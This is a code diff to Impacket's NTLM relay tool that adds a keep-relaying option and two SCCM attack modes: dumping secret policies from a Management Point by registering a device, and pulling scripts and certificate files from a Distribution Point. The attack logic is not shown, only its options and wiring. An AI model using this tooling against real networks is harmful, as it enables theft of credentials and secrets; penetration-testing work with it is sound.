@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -42,6 +44,7 @@ try:
     from urllib.request import ProxyHandler, build_opener, Request
 except ImportError:
     from urllib2 import ProxyHandler, build_opener, Request
+from urllib.parse import urlparse
 
 import json
 from time import sleep
@@ -183,6 +186,7 @@ def start_servers(options, threads):
         c.setEnumLocalAdmins(options.enum_local_admins)
         c.setAddComputerSMB(options.add_computer)
         c.setDisableMulti(options.no_multirelay)
+        c.setKeepRelaying(options.keep_relaying)
         c.setEncoding(codec)
         c.setMode(mode)
         c.setAttacks(PROTOCOL_ATTACKS)
@@ -205,7 +209,11 @@ def start_servers(options, threads):
         c.setIsShadowCredentialsAttack(options.shadow_credentials)
         c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type,
                                       options.cert_outfile_path)
-
+        c.setIsSCCMPoliciesAttack(options.sccm_policies)
+        c.setIsSCCMDPAttack(options.sccm_dp)
+        c.setSCCMPoliciesOptions(options.sccm_policies_clientname, options.sccm_policies_sleep)
+        c.setSCCMDPOptions(options.sccm_dp_extensions, options.sccm_dp_files)
+        
         c.setAltName(options.altname)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
@@ -291,6 +299,7 @@ if __name__ == '__main__':
     parser.add_argument('--raw-port', type=int, help='Port to listen on raw server', default=6666)
 
     parser.add_argument('--no-multirelay', action="store_true", required=False, help='If set, disable multi-host relay (SMB and HTTP servers)')
+    parser.add_argument('--keep-relaying', action="store_true", required=False, help='If set, keeps relaying to a target even after a successful connection on it')
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
@@ -399,6 +408,17 @@ if __name__ == '__main__':
                                    help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
     shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='filename to store the generated self-signed PEM or PFX certificate and key')
 
+    # SCCM policies options
+    sccmpoliciesoptions = parser.add_argument_group("SCCM Policies attack options")
+    sccmpoliciesoptions.add_argument('--sccm-policies', action='store_true', required=False, help='Enable SCCM policies attack. Performs SCCM secret policies dump from a Management Point by registering a device. Works best when relaying a machine account. Expects as target \'http://<MP>/ccm_system_windowsauth/request\'')
+    sccmpoliciesoptions.add_argument('--sccm-policies-clientname', action='store', required=False, help='The name of the client that will be registered in order to dump secret policies. Defaults to the relayed account\'s name')
+    sccmpoliciesoptions.add_argument('--sccm-policies-sleep', action='store', required=False, help='The number of seconds to sleep after the client registration before requesting secret policies')
+
+    sccmdpoptions = parser.add_argument_group("SCCM Distribution Point attack options")
+    sccmdpoptions.add_argument('--sccm-dp', action='store_true', required=False, help='Enable SCCM Distribution Point attack. Perform package file dump from an SCCM Distribution Point. Expects as target \'http://<DP>/sms_dp_smspkg$/Datalib\'')
+    sccmdpoptions.add_argument('--sccm-dp-extensions', action='store', required=False, help='A custom list of extensions to look for when downloading files from the SCCM Distribution Point. If not provided, defaults to .ps1,.bat,.xml,.txt,.pfx')
+    sccmdpoptions.add_argument('--sccm-dp-files', action='store', required=False, help='The path to a file containing a list of specific URLs to download from the Distribution Point, instead of downloading by extensions. Providing this argument will skip file indexing')
+
     try:
        options = parser.parse_args()
     except Exception as e:
@@ -408,6 +428,18 @@ if __name__ == '__main__':
     if options.rpc_use_smb and not options.auth_smb:
        logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
        sys.exit(1)
+    
+    # Ensuring the correct target is set when performing SCCM policies attack
+    if options.sccm_policies is True and not options.target.rstrip('/').endswith("/ccm_system_windowsauth/request"):
+        logging.error("When performing SCCM policies attack, the Management Point authenticated device registration endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/ccm_system_windowsauth/request")
+        sys.exit(1)
+
+    # Ensuring the correct target is set when performing SCCM DP attack
+    if options.sccm_dp is True and not options.target.rstrip('/').endswith("/sms_dp_smspkg$/Datalib"):
+        logging.error("When performing SCCM DP attack, the Distribution Point Datalib endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/sms_dp_smspkg$/Datalib")
+        sys.exit(1)
 
     # Init the example's logger theme
     logger.init(options.ts)
@@ -493,6 +525,12 @@ if __name__ == '__main__':
         threads.add(socks_thread)
 
     c = start_servers(options, threads)
+
+    # Log multirelay flag status
+    if options.no_multirelay:
+        logging.info("Multirelay disabled")
+    else:
+        logging.info("Multirelay enabled")
 
     print("")
     logging.info("Servers started, waiting for connections")
